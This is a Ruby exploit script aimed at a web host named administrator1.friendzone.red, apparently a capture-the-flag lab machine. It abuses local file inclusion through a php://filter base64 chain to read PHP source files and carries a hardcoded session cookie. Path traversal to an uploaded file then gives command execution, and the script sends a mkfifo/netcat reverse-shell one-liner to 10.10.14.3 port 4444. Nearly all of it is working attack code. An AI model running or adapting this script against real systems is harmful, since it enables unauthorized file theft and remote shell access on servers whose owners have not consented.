#!/bin/env ruby

require 'base64'
require 'net/http'
require 'openssl'
require 'pry'

ENDPOINT = 'https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg'
OUTPUT = './lifted'

def get(url)
  uri = URI.parse(url)

  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE

  request = Net::HTTP::Get.new(uri.request_uri)
  request['Cookie'] = 'FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' # static cookie, since it's somehow tied to the password

  response = http.request(request)

  unless response.code.eql?('200')
    log(sprintf('unexpected error[%s], body[%s]', response.code, response.body), :error)
    binding.pry
  end

  extract_contents(response.body)
end

def log(message, level = :debug)
  puts sprintf('[%s] [%5s] %s', Time.now.strftime('%H:%M.%S'), level.to_s.upcase!, message)
  exit(1) if level.eql?(:fatal)
end

def build_target(resource)
  sprintf('pagename=php://filter/convert.base64-encode/resource=%s', resource)
end

def extract_contents(body)
  contents = $1 if body.match(/\<\/h1\>\<\/center\>(.*)$/)
  #Base64.decode64(contents)
end

## main()

[
  #'dashboard',
  #'upload',
  #'login'
].each do |t|
  log(sprintf('target[%s]', t))
  u = sprintf('%s&%s', ENDPOINT, build_target(t))

  r = get(u)

  filename = sprintf('%s/%s.php', OUTPUT, t)

  File.open(filename, 'w') do |f|
    f.puts(r)
  end

  log(sprintf('got[%d] bytes, wrote to[%s]', r.size, filename), :info)

end

u = 'https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../etc/Development/cmd&cmd=id'

[
  'id',
  'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.3 4444>/tmp/f'
].each do |c|
  r = get(sprintf('https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../etc/Development/cmd&cmd=%s', c))

end

binding.pry





